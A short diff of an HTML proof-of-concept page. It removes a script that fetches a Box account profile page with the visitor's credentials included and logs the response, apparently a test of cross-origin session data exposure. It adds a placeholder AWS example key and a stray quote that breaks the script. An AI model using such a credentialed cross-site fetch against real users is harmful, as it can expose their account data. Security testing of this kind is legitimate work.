@@ -8,23 +8,8 @@
 <body>
     <h1>poc</h1>
     <script>
-        fetch('https://app.box.com/account/profile', {
-  method: 'GET',
-  credentials: 'include'
-})
-.then(response => {
-  if (!response.ok) {
-    throw new Error(`HTTP error! Status: ${response.status}`);
-  }
-  return response.text();
-})
-.then(data => {
-  console.log('Data profil berhasil diambil:', data);
-})
-.catch(error => {
-  console.error('Terjadi kesalahan saat fetch:', error);
-});
-
+    var key = 'AKIAIOSFODNN7EXAMPLE';
+'
     </script>
 </body>
 </html>
